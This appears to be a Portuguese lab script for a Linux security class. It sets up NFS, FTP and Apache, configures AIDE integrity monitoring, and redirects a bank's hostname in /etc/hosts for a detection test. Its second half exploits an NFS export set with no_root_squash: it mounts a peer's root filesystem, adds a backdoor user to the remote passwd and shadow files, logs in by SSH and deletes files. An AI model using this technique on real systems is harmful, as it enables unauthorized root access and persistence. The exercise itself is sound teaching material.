apt-get install apache2				# apache 2
apt-get install vsftpd				# servidor ftp 
apt-get install nfs-kernel-server	# network file system

10.254.254.x						# nova rede para a segunda interface do virtual box

# configuração
vi /etc/exports							# arquivo NTFS
 	/ 10.254.254.0/255.255.255.0(rw) 	# insere o barra no final do arquivo, espaço, a rota padrão da rede e as permissões dos usuários (rw)

/etc/init.d/nfs-kernel-server restart	# reiniciando o servidor
showmount --export 127.0.0.1			# mostrando o que está sendo compartilhado => Export list for 127.0.0.1 /10.254.254.0/255.255.255.0

# aide
apt-get install aide				# aide => No configuration
cp /etc/aide/aide.conf /etc/aide/aide.conf.def	# copiando arquivo

# achados e perdidos do Linux estão no /lost+found :)
# vamos monitorar o /bin, /lib, /usr, /boot, /etc, /lib64, /sbin e /var/log
# para configurar o aide, é necessário criar macros, ou regras de monitoramento
# aide contém flags para monitoramento específico
# p = permissão de arquivo
# i = inode
# n = quantidade de vínculos
# ...
# s = tamanho do arquivo - size

vi /etc/aide/aide.conf
	seg=p+u+s+md5+sha1
	log=p+u+S

	/bin seg
	/lib seg
	/usr seg
	/boot seg
	/etc seg
	/lib64 seg
	/sbin seg
	/var log

# configurar rede
ifconfig -a 				# placas de redes não ativas
vi /etc/network/interfaces	# arquivo de configuração das interfaces
	# minha rede
	auto enp0s8
	iface enp0s8 inet static
		address 10.254.254.[X|211]
		netmask 255.255.255.0

/etc/init.d/networking restart	# reiniciando os servicos de rede

aide -i -c /etc/aide/aide.conf 	# inicializa o aide
# foi criado um arquivo /var/lib/aide/aide.db.new
cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db	# copiando o arquivo
vi /etc/hosts
	127.0.0.1	www.bb.com.br

aide -c /etc/aide/aide.conf -C 	# verificando se o arquivo foi alterado

sudo apt-get install nmap		# nmap
nmap 10.254.254.208

showmount --exports 10.254.254.209

mount 10.254.254.X:/ /mnt 	# linka o diretório remoto
vi /etc/exports
	/ 10.254.254.0/255.255.255.0(rw,no_root_squash)		# no_root_squash permiti qualquer usuário como root

/etc/init.d/nfs-kernel-server restart		# reiniciando o servidor
showmount --export 10.254.254.X 			# mostra quais são diretórios que estão compartilhados com qualquer ip
mount 10.254.254.X:/ /mnt 					# linka o diretório / do ip para o diretório /mnt local

# para criar um usuário na máquina da pessoa
vi /mnt/etc/passwd							# arquivo da máquina do ip editando localmente
	y -> p # y copia; e p cola

mkdir /mnt/home/lular						# criando o diretório home do usuario novo
passwd lula 								# mudando senha local para ter certeza
grep lula /etc/shadow >> /mnt/etc/shadow	# recuperando a linha do usuário local e adicionando no remoto
# criar usuário sem root e repetir a operação
ssh lulan@10.254.254.X

# apagar alguma arquivo da máquina do hackeado
# na própria máquina
aide -c /etc/aide/aide.conf -C